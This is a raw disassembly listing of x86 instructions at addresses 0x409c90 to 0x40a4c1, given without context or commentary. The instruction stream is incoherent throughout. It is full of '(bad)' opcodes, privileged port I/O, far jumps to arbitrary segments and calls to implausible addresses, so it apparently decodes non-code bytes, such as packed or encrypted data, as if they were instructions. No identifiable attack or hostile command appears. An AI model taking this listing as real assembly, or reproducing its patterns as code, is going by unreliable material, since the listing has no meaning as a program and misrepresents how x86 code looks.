  409c90:	enter  0xefe3,0xc9
  409c94:	int3   
  409c95:	icebp  
  409c96:	sar    BYTE PTR [ebp-0x244c280a],0xd7
  409c9d:	xlat   BYTE PTR ds:[ebx]
  409c9e:	cmc    
  409c9f:	sar    BYTE PTR [ebx-0x4611273c],cl
  409ca5:	mov    ebp,0xd6e1fbe1
  409caa:	push   es
  409cab:	loopne 0x409c8c
  409cad:	fcmovnu st,st(0)
  409caf:	aad    0xb
  409cb1:	(bad)  
  409cb2:	(bad)  
  409cb4:	shl    ebx,0xe0
  409cb7:	fucom  st(0)
  409cb9:	mov    esp,0xf6c4b4e9
  409cbe:	rcl    bh,1
  409cc0:	iret   
  409cc1:	(bad)  
  409cc2:	fdiv   st(7),st
  409cc4:	mov    ebp,0xe3bebdf0
  409cc9:	repnz mul dh
  409ccc:	jmp    0x409cb4
  409cce:	pop    es
  409ccf:	test   DWORD PTR ds:0xecee0408,0xe3f3dedf
  409cd9:	shl    dl,1
  409cdb:	aad    0xad
  409cdd:	jmp    0x409ca8
  409cdf:	int3   
  409ce0:	in     al,dx
  409ce1:	mov    bh,0xb3
  409ce3:	mov    ch,0xb8
  409ce5:	mov    ah,0xb7
  409ce7:	shr    ebp,0xb4
  409cea:	jecxz  0x409ccc
  409cec:	in     eax,0xf7
  409cee:	or     ebx,esp
  409cf0:	fsubr  st(7),st
  409cf2:	ret    
  409cf3:	call   0xc01a6efa
  409cf8:	enter  0xb0d2,0xfb
  409cfc:	mov    ch,0xb7
  409cfe:	test   dh,0xad
  409d01:	(bad)
  409d04:	into   
  409d05:	xlat   BYTE PTR ds:[ebx]
  409d06:	add    bh,bl
  409d08:	test   ch,0xbc
  409d0b:	jmp    0x409cc6
  409d0d:	loop   0x409cf9
  409d0f:	std    
  409d10:	retf   0xfbd6
  409d13:	call   0xedf983f8
  409d18:	retf   
  409d19:	ret    
  409d1a:	rcl    esp,cl
  409d1c:	ror    esp,cl
  409d1e:	mov    ah,0xea
  409d20:	retf   0xf5f4
  409d23:	fidivr WORD PTR [ebp-0x2ef8090d]
  409d29:	xlat   BYTE PTR ds:[ebx]
  409d2a:	add    dl,dh
  409d2c:	(bad)  
  409d2d:	jmp    0xe3cb:0xfb03ddd9
  409d34:	clc    
  409d35:	add    cl,ch
  409d37:	rcl    bl,cl
  409d39:	rcl    ah,cl
  409d3b:	(bad)  
  409d3d:	mov    bh,0xc1
  409d3f:	in     eax,dx
  409d40:	repz clc 
  409d42:	mov    dh,0xd2
  409d44:	repz int 0xc8
  409d47:	stc    
  409d48:	ret    
  409d49:	hlt    
  409d4a:	jecxz  0x409d46
  409d4c:	in     eax,0x1
  409d4e:	inc    bh
  409d50:	sti    
  409d51:	retf   0xcc0e
  409d54:	retf   
  409d55:	stc    
  409d56:	ffreep st(4)
  409d58:	out    0xcb,eax
  409d5a:	ret    0xb1f5
  409d5d:	in     eax,dx
  409d5e:	repz f2xm1 
  409d61:	(bad)  
  409d62:	enter  0xdacd,0xb0
  409d66:	add    edx,esi
  409d68:	in     al,dx
  409d69:	push   eax
  409d6b:	sti    
  409d6c:	add    esp,edx
  409d6e:	test   BYTE PTR [ecx],0xb
  409d71:	sti    
  409d72:	out    dx,eax
  409d73:	or     ebp,edx
  409d75:	in     al,0xea
  409d77:	ffreep st(3)
  409d79:	mov    bl,0xd6
  409d7b:	in     al,dx
  409d7c:	fcmovnu st,st(2)
  409d7e:	out    0xe7,al
  409d80:	bnd call 0xdb1f577a
  409d86:	std    
  409d87:	mov    ebp,0xf3ddc2de
  409d8c:	cli    
  409d8d:	push   edi
  409d8f:	sar    ebx,0xca
  409d92:	cmc    
  409d93:	fmul   DWORD PTR [eax]
  409d95:	retf   
  409d96:	fsub   st,st(3)
  409d98:	lds    edi,FWORD PTR [edi+eax*8-0xf4f2e11]
  409d9f:	div    BYTE PTR [eax-0x141b090d]
  409da5:	retf   0xfdd9
  409da8:	(bad)  
  409da9:	mov    ebp,0xc2c1e1e4
  409dae:	aam    0xdd
  409db0:	loope  0x409d76
  409db2:	jmp    0xadc4:0xf0daf8c5
  409db9:	mov    dh,0xcb
  409dbb:	mov    bh,0xa9
  409dbd:	loop   0x409d7a
  409dbf:	mov    ecx,0xece9e8fb
  409dc4:	mov    esi,0xe6ced2fa
  409dc9:	add    edi,edx
  409dcb:	loopne 0x409dae
  409dcd:	cld    
  409dce:	xabort 0xdd
  409dd1:	add    eax,0xcd30301
  409dd6:	mov    bl,0xd2
  409dd8:	into   
  409dd9:	repz fucom st(2)
  409ddc:	loopne 0x409da0
  409dde:	(bad)  
  409ddf:	lock in eax,0xdf
  409de2:	in     al,dx
  409de3:	aam    0xf8
  409de5:	sar    cl,cl
  409de7:	shl    bl,0xcc
  409dea:	rcl    ah,cl
  409dec:	shl    al,cl
  409dee:	faddp  st(6),st
  409df0:	cld    
  409df1:	fsub   st,st(7)
  409df3:	jecxz  0x409dd6
  409df5:	bsf    edi,DWORD PTR [esi+ebx*8-0x3f554209]
  409dfd:	in     al,dx
  409dfe:	icebp  
  409dff:	mov    edx,0xbef0d8b6
  409e04:	int    0xd4
  409e06:	aam    0xcf
  409e08:	add    DWORD PTR ds:0xd50ad2c3,eax
  409e0e:	add    eax,0xf8fad6fa
  409e13:	in     eax,0xdd
  409e15:	clc    
  409e16:	mov    cl,0xf0
  409e18:	lock scas al,BYTE PTR es:[edi]
  409e1a:	jecxz  0x409dc8
  409e1c:	retf   0xb5b4
  409e1f:	call   esi
  409e21:	mov    eax,0xc9b4d7cf
  409e26:	out    dx,al
  409e27:	mov    edi,0xfff6e5f6
  409e2c:	out    0xd4,al
  409e2e:	loope  0x409e32
  409e30:	(bad)  
  409e31:	or     bh,bh
  409e33:	(bad)  
  409e35:	fmulp  st(5),st
  409e37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e38:	mul    ecx
  409e3a:	mov    cl,0xb6
  409e3c:	lods   al,BYTE PTR ds:[esi]
  409e3d:	call   0xba129e02
  409e42:	(bad)  
  409e44:	int    0xca
  409e46:	xlat   BYTE PTR ds:[ebx]
  409e47:	std    
  409e48:	add    esp,esi
  409e4a:	mov    ebp,0xc206e2c3
  409e4f:	std    
  409e50:	out    0xc6,eax
  409e52:	cli    
  409e53:	or     DWORD PTR [ebx],eax
  409e55:	adc    ch,BYTE PTR [ebp-0xb33281d]
  409e5b:	icebp  
  409e5c:	loop   0x409e2b
  409e5e:	jmp    0x409e38
  409e60:	int    0xe4
  409e62:	mov    bl,0xd4
  409e64:	std    
  409e65:	repz ret 0xd8ba
  409e69:	out    0xbd,al
  409e6b:	aad    0xc5
  409e6d:	ret    0x602
  409e70:	mul    bh
  409e72:	call   0xcd4b883c
  409e77:	fst    st(6)
  409e79:	mov    esp,0xf0b3b1e9
  409e7e:	frstpm(287 only) 
  409e80:	mov    cl,0xba
  409e82:	std    
  409e83:	in     al,dx
  409e84:	icebp  
  409e85:	enter  0xf6f9,0xcf
  409e89:	add    ebp,ebx
  409e8b:	repz stc 
  409e8d:	stc    
  409e8e:	jecxz  0x409e5b
  409e90:	std    
  409e91:	retf   0xcff
  409e94:	(bad)  
  409e95:	(bad)  
  409e96:	out    dx,al
  409e97:	(bad)  
  409e98:	repz shl BYTE PTR [ebp-0x536084e],cl
  409e9f:	into   
  409ea0:	repz out dx,eax
  409ea2:	enter  0xeed2,0xd6
  409ea6:	fdivrp st(6),st
  409ea8:	repz (bad) 
  409eaa:	sar    ecx,cl
  409eac:	(bad)  
  409ead:	xlat   BYTE PTR ds:[ebx]
  409eae:	rcr    dh,0xdc
  409eb1:	out    dx,eax
  409eb2:	push   cs
  409eb3:	fcmovbe st,st(3)
  409eb5:	jecxz  0x409e80
  409eb7:	out    0xc5,eax
  409eb9:	retf   
  409eba:	mov    esp,0xc9cac2f7
  409ebf:	xlat   BYTE PTR ds:[ebx]
  409ec0:	iret   
  409ec1:	(bad)  
  409ec2:	clc    
  409ec3:	int    0xc3
  409ec5:	repz add esi,edi
  409ec8:	into   
  409ec9:	clc    
  409eca:	add    bl,dl
  409ecc:	add    eax,0xef07dbde
  409ed1:	leave  
  409ed2:	fsub   st,st(7)
  409ed4:	(bad)  
  409ed5:	int    0xc5
  409ed7:	in     eax,0xe0
  409ed9:	jmp    0xf9b3:0xfacedcc5
  409ee0:	fcmovnbe st,st(7)
  409ee2:	retf   0xf5fc
  409ee5:	mov    edx,0xedd9bef5
  409eea:	fld    QWORD PTR [edx]
  409eec:	out    0xf0,eax
  409eee:	add    edx,eax
  409ef0:	fild   WORD PTR [esi]
  409ef2:	loopne 0x409f07
  409ef4:	in     al,dx
  409ef5:	ffree  st(2)
  409ef7:	jmp    0x409ed7
  409ef9:	loopne 0x409ec7
  409efb:	jecxz  0x409ebe
  409efd:	rcl    edx,1
  409eff:	shl    ecx,cl
  409f01:	repz icebp 
  409f03:	mov    ebp,0xd6bccfd1
  409f08:	(bad)  
  409f0a:	push   es
  409f0b:	aam    0xd9
  409f0d:	cli    
  409f0e:	xlat   BYTE PTR ds:[ebx]
  409f0f:	ror    al,0xe1
  409f12:	push   es
  409f13:	leave  
  409f14:	int3   
  409f15:	fnstsw WORD PTR [eax-0x4e15102e]
  409f1b:	test   bl,0xb0
  409f1e:	fcmovb st,st(4)
  409f20:	sti    
  409f21:	mov    ah,0xf7
  409f23:	neg    edx
  409f25:	cld    
  409f26:	mov    ecx,0xccf700df
  409f2b:	(bad)  
  409f2c:	ffreep st(4)
  409f2e:	in     al,0xff
  409f30:	(bad)  
  409f31:	fcomp  st(1)
  409f33:	enter  0xed13,0xd2
  409f37:	(bad)
  409f3a:	(bad)  
  409f3b:	out    dx,al
  409f3c:	aam    0xeb
  409f3e:	rcr    cl,0xd9
  409f41:	fcmovu st,st(3)
  409f43:	fbstp  TBYTE PTR [ecx-0x849ff23]
  409f49:	sti    
  409f4a:	add    cl,BYTE PTR [ebx]
  409f4c:	(bad)  
  409f4d:	loop   0x409f40
  409f4f:	(bad)  
  409f50:	psrad  mm5,mm3
  409f53:	in     al,0xe2
  409f55:	stc    
  409f56:	loope  0x409f1a
  409f58:	test   dh,0xf7
  409f5b:	in     eax,dx
  409f5c:	mov    bl,0xea
  409f5e:	(bad)  
  409f60:	jmp    0xdbec:0xeecbd9d7
  409f67:	mov    ebp,0xf8edcef9
  409f6c:	jmp    0x409f40
  409f6e:	aam    0xfe
  409f70:	(bad)  
  409f71:	cmc    
  409f72:	add    cl,cl
  409f74:	pop    es
  409f75:	jmp    0x409f49
  409f77:	mov    esi,0xc3d7d0f7
  409f7c:	jmp    0xd9f6:0xbae8d8f0
  409f83:	mov    eax,0xbedad0eb
  409f88:	repnz int 0xe2
  409f8b:	std    
  409f8c:	ffreep st(3)
  409f8e:	stc    
  409f8f:	fcmovu st,st(3)
  409f91:	add    edx,ebp
  409f93:	or     eax,0xcaccffde
  409f98:	jmp    0x409f4c
  409f9a:	out    0xb3,al
  409f9c:	ret    
  409f9d:	aam    0xba
  409f9f:	mov    ebx,0xb9f0f3b7
  409fa4:	jmp    0x409f79
  409fa6:	fdivr  DWORD PTR [eax-0x1c3ff832]
  409fac:	in     eax,0xf2
  409fae:	out    0xc1,al
  409fb0:	vpmaxsw ymm2,ymm0,ymm4
  409fb4:	in     al,0xce
  409fb6:	ror    eax,1
  409fb8:	call   0xca15676a
  409fbd:	in     eax,0xdb
  409fbf:	jmp    0x409f89
  409fc1:	fistp  QWORD PTR [ebp-0x4261d36]
  409fc7:	out    0xef,eax
  409fc9:	std    
  409fca:	loope  0x409fbe
  409fcc:	loop   0x409fcc
  409fce:	retf   0xe0e1
  409fd1:	test   bh,0xda
  409fd4:	push   es
  409fd5:	or     esi,DWORD PTR [ebx-0x543b343b]
  409fdb:	leave  
  409fdc:	out    dx,eax
  409fdd:	(bad)  
  409fde:	jmp    0x409fb5
  409fe0:	rcr    esi,cl
  409fe2:	(bad)
  409fe5:	enter  0xbcd4,0xbf
  409fe9:	add    ah,al
  409feb:	rcl    dl,0xda
  409fee:	add    edi,DWORD PTR [esi-0x5fe151e]
  409ff4:	shl    eax,cl
  409ff6:	shl    cl,1
  409ff8:	out    dx,al
  409ff9:	int    0xc4
  409ffb:	repnz lock repnz out 0xc4,al
  40a000:	sar    bh,1
  40a002:	mov    bl,0xd1
  40a004:	cld    
  40a005:	(bad)  
  40a007:	add    ecx,eax
  40a009:	fsubrp st(4),st
  40a00b:	cld    
  40a00c:	jmp    0xc5eb:0xf5e5d6d2
  40a013:	std    
  40a014:	add    eax,0xcee4d0e8
  40a019:	shl    dh,0xe8
  40a01c:	ror    bh,1
  40a01e:	loope  0x40a01a
  40a020:	jmp    0x40a016
  40a022:	in     eax,0xbd
  40a024:	mul    edx
  40a026:	(bad)  
  40a027:	mov    ecx,0xf0da01c1
  40a02c:	sti    
  40a02d:	out    0x8,eax
  40a02f:	test   edi,0x1fae504
  40a035:	push   cs
  40a036:	lods   eax,DWORD PTR ds:[esi]
  40a037:	out    0xb1,al
  40a039:	mov    dl,0xc2
  40a03b:	xlat   BYTE PTR ds:[ebx]
  40a03c:	(bad)  
  40a03d:	rcr    edx,cl
  40a03f:	mov    ebx,0xbaf1f5f0
  40a044:	loop   0x40a03f
  40a046:	inc    DWORD PTR [edx]
  40a048:	in     eax,dx
  40a049:	(bad)  
  40a04a:	fmulp  st(4),st
  40a04c:	repz jmp 0x40a035
  40a04f:	retf   0xd6c5
  40a052:	into   
  40a053:	fsub   st(1),st
  40a055:	fmul   st,st(4)
  40a057:	rol    edi,0xbc
  40a05a:	mov    al,0xfb
  40a05d:	shr    ebx,1
  40a05f:	shr    dl,1
  40a061:	in     eax,0xdf
  40a063:	mov    edi,0xccc2c8bf
  40a068:	jecxz  0x40a04d
  40a06a:	add    esi,esp
  40a06c:	loope  0x40a042
  40a06e:	dec    BYTE PTR [edi]
  40a070:	aad    0xe1
  40a072:	enter  0xea13,0xe5
  40a076:	in     al,dx
  40a077:	jmp    0xc9ca:0xcbcbd7ae
  40a07e:	sti    
  40a07f:	jmp    0xe3f78c74
  40a084:	fmul   st(6),st
  40a086:	mov    eax,0xe106d7fb
  40a08b:	fild   WORD PTR [eax]
  40a08d:	(bad)  
  40a08e:	out    0xfc,eax
  40a090:	add    DWORD PTR [ebx],eax
  40a092:	or     al,0xe5
  40a094:	or     ah,ah
  40a096:	mov    ecx,0xacc2cab2
  40a09b:	iret   
  40a09c:	shl    ebx,0xf6
  40a09f:	int3   
  40a0a0:	cli    
  40a0a1:	fcmovnbe st,st(5)
  40a0a3:	repnz stc 
  40a0a5:	xlat   BYTE PTR ds:[ebx]
  40a0a6:	mov    bh,0xd5
  40a0a8:	sti    
  40a0a9:	mov    eax,0xdcd9e6dd
  40a0ae:	stc    
  40a0af:	ret    0xede2
  40a0b2:	loop   0x40a0b3
  40a0b4:	loope  0x40a076
  40a0b6:	fucomip st,st(7)
  40a0b8:	test   eax,0xb1c8efc0
  40a0bd:	mov    al,0xd0
  40a0bf:	repz enter 0xffca,0xb8
  40a0c4:	(bad)  
  40a0c6:	fadd   st(1),st
  40a0c8:	lock out dx,al
  40a0ca:	(bad)  
  40a0cb:	lds    eax,FWORD PTR [ecx+ebx*8]
  40a0ce:	fcmovu st,st(3)
  40a0d0:	add    ah,dh
  40a0d2:	aam    0xeb
  40a0d4:	cli    
  40a0d5:	fisubr WORD PTR [edx-0x14421c1e]
  40a0db:	rol    edi,1
  40a0dd:	repz (bad) 
  40a0df:	call   0xec3f8fb9
  40a0e4:	cmc    
  40a0e5:	(bad)  
  40a0e6:	mov    bh,0xc0
  40a0e8:	mov    ch,0xf2
  40a0ea:	fdivp  st(5),st
  40a0ec:	sar    DWORD PTR [eax-0x1c231e08],cl
  40a0f2:	jmp    0xf1c4:0xe109f2cb
  40a0f9:	out    dx,eax
  40a0fa:	leave  
  40a0fb:	loop   0x40a0e0
  40a0fd:	hlt    
  40a0fe:	mov    dl,0xe0
  40a100:	imul   ebp
  40a102:	mov    ebx,0xcdd9ceda
  40a107:	aad    0xbe
  40a109:	add    eax,ecx
  40a10b:	in     al,dx
  40a10c:	lock retf 
  40a10e:	add    esi,edi
  40a110:	add    al,0xd
  40a112:	or     ebp,ebx
  40a114:	stc    
  40a115:	fcomip st,st(0)
  40a117:	shl    DWORD PTR [ecx-0x3e304a0e],1
  40a11d:	mov    al,0xf8
  40a11f:	iret   
  40a120:	mov    bh,0xf6
  40a122:	aad    0xf0
  40a124:	(bad)  
  40a125:	fdivr  st(2),st
  40a127:	repz stc 
  40a129:	add    eax,0xe0ebbdfa
  40a12e:	sti    
  40a12f:	out    dx,eax
  40a130:	pop    es
  40a131:	(bad)  
  40a132:	aam    0xfe
  40a134:	fmul   QWORD PTR [eax]
  40a136:	leave  
  40a137:	mov    bl,0xc7
  40a139:	iret   
  40a13a:	imul   BYTE PTR [ebp-0x2f102919]
  40a140:	fdiv   DWORD PTR [eax-0x1d162a13]
  40a146:	lock pop es
  40a148:	add    esi,DWORD PTR [eax+edx*8-0x3f2e2c2f]
  40a14f:	jmp    0x40a15b
  40a151:	(bad)  
  40a153:	(bad)  
  40a154:	fsubr  st,st(7)
  40a156:	enter  0xe8ae,0xf1
  40a15a:	in     al,dx
  40a15b:	aad    0xdb
  40a15d:	lods   al,BYTE PTR ds:[esi]
  40a15e:	mov    dl,0xca
  40a160:	(bad)  
  40a161:	(bad)  
  40a162:	mov    edi,0xf5d1d0b4
  40a167:	int3   
  40a168:	iret   
  40a169:	stc    
  40a16a:	fld    QWORD PTR [ecx]
  40a16c:	clc    
  40a16d:	(bad)  
  40a16e:	mov    edi,0xddd6ebfb
  40a173:	adc    esp,esp
  40a175:	add    eax,0xccc4aae3
  40a17a:	call   0xcc26633b
  40a17f:	icebp  
  40a180:	jmp    0x40a153
  40a182:	idiv   BYTE PTR [esi-0x22282822]
  40a188:	out    dx,eax
  40a189:	hlt    
  40a18a:	jecxz  0x40a177
  40a18c:	push   es
  40a18d:	(bad)  
  40a18f:	call   0x205959a
  40a194:	leave  
  40a195:	loop   0x40a166
  40a197:	in     eax,0xad
  40a199:	leave  
  40a19a:	scas   eax,DWORD PTR es:[edi]
  40a19b:	rcr    bl,cl
  40a19d:	(bad)  
  40a19e:	loope  0x40a18f
  40a1a0:	(bad)
  40a1a3:	stc    
  40a1a4:	int3   
  40a1a5:	fdiv   st(4),st
  40a1a7:	mov    esi,0xe2bfbde3
  40a1ac:	add    cl,ah
  40a1ae:	in     eax,0x9
  40a1b0:	fcomi  st,st(6)
  40a1b2:	add    eax,0xd3decbe7
  40a1b7:	shr    ebx,cl
  40a1b9:	iret   
  40a1ba:	ror    cl,0xe8
  40a1bd:	in     eax,dx
  40a1be:	scas   eax,DWORD PTR es:[edi]
  40a1bf:	repz fdiv st,st(6)
  40a1c2:	fdiv   st(4),st
  40a1c4:	out    dx,eax
  40a1c5:	mov    ecx,0xdcc307b7
  40a1ca:	ret    
  40a1cb:	shl    al,1
  40a1cd:	repnz or ch,cl
  40a1d0:	add    ch,al
  40a1d2:	(bad)  
  40a1d3:	retf   
  40a1d4:	jmp    0x40a1b6
  40a1d6:	loope  0x40a19a
  40a1d8:	loopne 0x40a18c
  40a1da:	mov    al,0xd7
  40a1dc:	leave  
  40a1dd:	loopne 0x40a1d3
  40a1df:	jmp    0xbd0f76c9
  40a1e4:	mov    eax,0xfce8bff8
  40a1e9:	in     eax,dx
  40a1ea:	fiadd  WORD PTR [edi]
  40a1ec:	rol    BYTE PTR [edi],1
  40a1ee:	lock ret 0xe2e3
  40a1f2:	add    al,0xd
  40a1f4:	cli    
  40a1f5:	or     al,0xe9
  40a1f7:	shl    esi,1
  40a1f9:	repz mov ch,0xcb
  40a1fc:	shl    DWORD PTR [edi-0x3b103039],cl
  40a202:	retf   0xb4fa
  40a205:	shl    eax,cl
  40a207:	add    bh,bl
  40a209:	int3   
  40a20a:	add    eax,0xe1f0c7fa
  40a20f:	loope  0x40a1fa
  40a211:	loope  0x40a213
  40a213:	dec    ch
  40a215:	out    0xee,al
  40a217:	repnz in al,dx
  40a219:	rcr    ch,cl
  40a21b:	mov    dh,0xe5
  40a21d:	jmp    0xd5139adb
  40a222:	mov    edi,0xdcecf1dd
  40a227:	enter  0xd7da,0xcc
  40a22b:	aad    0xda
  40a22d:	shl    bh,cl
  40a22f:	clc    
  40a230:	push   es
  40a231:	retf   
  40a232:	jmp    0xf6df:0xcde2fcce
  40a239:	fsub   st(2),st
  40a23b:	shl    DWORD PTR [ecx-0x132f321a],cl
  40a241:	mov    ecx,0xc9b5ecea
  40a246:	jmp    0xf440a048
  40a24b:	lock aam 0xf1
  40a24e:	(bad)  
  40a250:	in     eax,0x3
  40a252:	retf   0xedcf
  40a255:	(bad)  
  40a257:	fstp   st(6)
  40a259:	ror    ebp,1
  40a25b:	shr    ebp,cl
  40a25d:	out    dx,eax
  40a25e:	rcl    bl,cl
  40a260:	div    cl
  40a262:	in     al,dx
  40a263:	mov    dh,0xcb
  40a265:	int    0xb9
  40a267:	int    0xf7
  40a269:	hlt    
  40a26a:	add    al,0x2
  40a26c:	loope  0x40a25f
  40a26e:	add    cl,bl
  40a270:	mov    ebp,0xdd0405e5
  40a275:	cli    
  40a276:	iret   
  40a277:	loopne 0x40a240
  40a279:	out    0xed,al
  40a27b:	in     al,dx
  40a27c:	retf   0xe1d7
  40a27f:	(bad)  
  40a280:	(bad)  
  40a281:	cli    
  40a282:	rcl    ebx,cl
  40a284:	cli    
  40a285:	int    0xdb
  40a287:	sar    ecx,0xd1
  40a28a:	ror    ah,1
  40a28c:	stc    
  40a28d:	add    al,0xe9
  40a28f:	pop    es
  40a290:	loopne 0x40a292
  40a292:	stc    
  40a293:	pop    es
  40a294:	fucomp st(7)
  40a296:	call   0xc6024f4b
  40a29b:	lock mov ah,0xd5
  40a29e:	out    0xd6,eax
  40a2a0:	retf   0xefbf
  40a2a3:	into   
  40a2a4:	shl    ah,1
  40a2a6:	sti    
  40a2a7:	sti    
  40a2a8:	mov    ch,0xc7
  40a2aa:	stc    
  40a2ab:	add    al,0xe5
  40a2ad:	fnop   
  40a2af:	in     eax,0xdb
  40a2b1:	jmp    0x40a2a8
  40a2b3:	add    ah,dl
  40a2b5:	enter  0xbfe5,0xbc
  40a2b9:	loopne 0x40a29f
  40a2bb:	mov    dh,0xdb
  40a2bd:	mov    ch,0xeb
  40a2bf:	cli    
  40a2c0:	out    0xe4,eax
  40a2c2:	mov    eax,0xfcccd3fb
  40a2c7:	(bad)  
  40a2c9:	rol    ebx,0xff
  40a2cc:	clc    
  40a2cd:	mov    esp,0xdec6c7d6
  40a2d2:	jmp    0xb7ef:0xc8e5c5e0
  40a2d9:	jecxz  0x40a2c7
  40a2db:	stos   BYTE PTR es:[edi],al
  40a2dc:	mov    dh,0xc1
  40a2de:	mov    edx,0xc9fde4f9
  40a2e3:	cmc    
  40a2e4:	jmp    0xc2fa7ddb
  40a2e9:	in     al,dx
  40a2ea:	icebp  
  40a2eb:	icebp  
  40a2ec:	(bad)  
  40a2ed:	mov    esp,0xe80be2d8
  40a2f2:	std    
  40a2f3:	(bad)  
  40a2f4:	out    dx,eax
  40a2f5:	jecxz  0x40a2c5
  40a2f7:	retf   
  40a2f8:	retf   
  40a2f9:	shl    DWORD PTR [edi-0x480e051e],1
  40a2ff:	int3   
  40a300:	in     al,dx
  40a301:	in     al,dx
  40a302:	fcomip st,st(5)
  40a304:	jmp    0xdafe:0xe1def8be
  40a30b:	ret    0xc305
  40a30e:	(bad)  
  40a30f:	in     eax,0xd4
  40a311:	add    edi,ebx
  40a313:	in     eax,0xea
  40a315:	(bad)  
  40a316:	scas   al,BYTE PTR es:[edi]
  40a317:	repnz mov esp,0xcbf4b6ce
  40a31d:	hlt    
  40a31e:	aad    0xb7
  40a320:	enter  0xd4b9,0xdf
  40a324:	jmp    0xbe3b9a17
  40a329:	fild   WORD PTR [eax]
  40a32b:	shl    ebp,0xeb
  40a32e:	lock loopne 0x40a312
  40a331:	aad    0xd8
  40a333:	ret    0xcbec
  40a336:	(bad)  
  40a337:	shl    eax,1
  40a339:	scas   al,BYTE PTR es:[edi]
  40a33a:	iret   
  40a33b:	in     eax,0xc8
  40a33d:	out    0xc7,eax
  40a33f:	icebp  
  40a340:	lods   eax,DWORD PTR ds:[esi]
  40a341:	retf   
  40a342:	mov    edi,0xefeceafe
  40a347:	out    dx,eax
  40a348:	jecxz  0x40a327
  40a34a:	mov    esp,0xcb06ebfb
  40a34f:	in     eax,0xd6
  40a351:	in     eax,dx
  40a352:	retf   
  40a353:	fxch   st(2)
  40a355:	add    ch,BYTE PTR [eax-0xf28383a]
  40a35b:	into   
  40a35c:	shl    eax,1
  40a35e:	in     al,0xd9
  40a360:	cli    
  40a361:	icebp  
  40a362:	retf   
  40a363:	mov    ebp,0xdcd3c9da
  40a368:	add    eax,ebx
  40a36a:	add    edi,DWORD PTR [ecx+eiz*8-0x111539fe]
  40a371:	jmp    0x40a340
  40a373:	or     esi,ebx
  40a375:	jecxz  0x40a362
  40a377:	jmp    0x40a337
  40a379:	mov    esp,0xd5edd0ad
  40a37e:	leave  
  40a37f:	retf   
  40a380:	(bad)  
  40a382:	xlat   BYTE PTR ds:[ebx]
  40a383:	stc    
  40a384:	bnd call 0x30f8472
  40a38a:	fld    st(5)
  40a38c:	fcom   st(6)
  40a38e:	fcmovu st,st(4)
  40a390:	call   0xc458783
  40a395:	ror    eax,cl
  40a397:	lock out dx,al
  40a399:	cmc    
  40a39a:	fucomp st(6)
  40a39c:	shl    BYTE PTR [eax-0x31331a2d],1
  40a3a2:	(bad)  
  40a3a3:	stc    
  40a3a4:	repnz repz mov edx,0xe3bfc1c8
  40a3ab:	lock pop es
  40a3ad:	sti    
  40a3ae:	or     esi,esi
  40a3b0:	loop   0x40a3ae
  40a3b2:	or     eax,0xcecbe6ea
  40a3b7:	int    0xde
  40a3b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3ba:	ror    ecx,0xec
  40a3bd:	aad    0xcd
  40a3bf:	retf   0xb0c7
  40a3c2:	mov    edx,0xdfb4b4d8
  40a3c7:	mov    esi,0xd807f2b5
  40a3cc:	aad    0xd4
  40a3ce:	in     al,0x5
  40a3d0:	test   DWORD PTR [esi],0xe70ac8ca
  40a3d6:	retf   0xdcd7
  40a3d9:	shl    DWORD PTR [ebx-0x282c1256],0xc5
  40a3e0:	bnd jmp 0x40a399
  40a3e3:	hlt    
  40a3e4:	mov    ecx,0xfeedd9e9
  40a3e9:	add    bh,dh
  40a3eb:	xlat   BYTE PTR ds:[ebx]
  40a3ec:	jmp    0xfbc9:0x5f8e3d0
  40a3f3:	or     DWORD PTR [ebx],edx
  40a3f5:	into   
  40a3f6:	ret    
  40a3f7:	fucom  st(3)
  40a3f9:	test   al,0xd5
  40a3fb:	shr    DWORD PTR [ebp-0x4f1b4936],cl
  40a401:	icebp  
  40a402:	icebp  
  40a403:	clc    
  40a404:	jmp    0x40a3d0
  40a406:	mov    eax,0xe7eef0f1
  40a40b:	pop    es
  40a40c:	shl    edi,0xb
  40a40f:	call   0xfc456f18
  40a414:	retf   0xc1ee
  40a417:	(bad)  
  40a419:	jmp    0xc12992e6
  40a41e:	loopne 0x40a3e0
  40a420:	int3   
  40a421:	into   
  40a422:	in     al,dx
  40a423:	fsubrp st(3),st
  40a425:	fdivr  st,st(0)
  40a427:	repnz jecxz 0x40a40f
  40a42a:	shl    dh,0x6
  40a42d:	lock stc 
  40a42f:	out    dx,eax
  40a430:	mov    ebp,0xcdede9bc
  40a435:	pop    es
  40a436:	lods   al,BYTE PTR ds:[esi]
  40a437:	jmp    0xf3c2:0xc7adc6cd
  40a43e:	out    dx,al
  40a43f:	out    0xb0,al
  40a441:	lds    edi,FWORD PTR [ecx-0x46332912]
  40a447:	ret    0xf4b8
  40a44a:	test   bh,0x0
  40a44d:	jmp    0xeded:0x8deca0b
  40a454:	jmp    0x40a462
  40a456:	enter  0xbcc2,0xf7
  40a45a:	jmp    0xf9e7:0xb1ebd3f0
  40a461:	fstp   TBYTE PTR [eax-0xe082914]
  40a467:	xlat   BYTE PTR ds:[ebx]
  40a468:	fadd   QWORD PTR [edx]
  40a46a:	loopne 0x40a447
  40a46c:	fnop   
  40a46e:	jmp    0x103ca282
  40a473:	out    dx,eax
  40a474:	fmul   DWORD PTR [esi]
  40a476:	(bad)  
  40a478:	loop   0x40a440
  40a47a:	repnz loope 0x40a46e
  40a47d:	out    0xd7,eax
  40a47f:	hlt    
  40a480:	lods   eax,DWORD PTR ds:[esi]
  40a481:	fsubr  st,st(6)
  40a483:	(bad)  
  40a485:	mov    ebp,0xc6bc01c1
  40a48a:	in     al,0xfd
  40a48c:	shl    edi,0xdc
  40a48f:	loope  0x40a456
  40a491:	(bad)  
  40a493:	out    dx,eax
  40a494:	stc    
  40a495:	(bad)  
  40a497:	mov    cl,0xf7
  40a49a:	(bad)  
  40a49b:	out    0xd7,al
  40a49d:	in     eax,dx
  40a49e:	sti    
  40a49f:	int3   
  40a4a0:	in     eax,0xd0
  40a4a2:	cld    
  40a4a3:	mov    esi,0xf3fbeef0
  40a4a8:	out    0xd4,eax
  40a4aa:	add    bl,al
  40a4ac:	hlt    
  40a4ad:	faddp  st(4),st
  40a4af:	fimul  DWORD PTR [eax]
  40a4b1:	(bad)  
  40a4b2:	out    dx,al
  40a4b3:	add    DWORD PTR [ebx],eax
  40a4b5:	std    
  40a4b6:	leave  
  40a4b7:	lods   eax,DWORD PTR ds:[esi]
  40a4b8:	lods   eax,DWORD PTR ds:[esi]
  40a4b9:	retf   
  40a4ba:	lock loopne 0x40a4ac
  40a4bd:	out    dx,al
  40a4be:	fld    st(4)
  40a4c0:	in     al,dx
  40a4c1:	cmc    
